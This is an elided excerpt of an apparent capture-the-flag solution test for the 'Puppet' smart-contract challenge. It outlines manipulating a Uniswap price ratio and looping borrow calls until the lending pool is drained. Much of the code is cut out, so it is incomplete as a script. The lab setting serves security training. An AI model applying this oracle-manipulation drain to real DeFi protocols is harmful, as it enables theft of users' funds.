...
describe("[Challenge] Puppet", function () {
  ...
  it("Execution", async function () {
    ...
    // Add token token to uniswap exchange to change the ratio

    let tokenBalancebefore = await token.balanceOf(player.address);

    while ((await token.balanceOf(lendingPool.address)) > 0) {
      await token.approve(
      ...
      // let overflowamount = ethers.constants.MaxUint256.decres;

      await lendingPool.borrow(ethers.utils.parseEther("500"), player.address, {
    ...
    let tokenBalanceafter = await token.balanceOf(player.address);

    let poolTokenBalanceAfter = await token.balanceOf(lendingPool.address);

    let ethbalance = await ethers.provider.getBalance(player.address);
  });
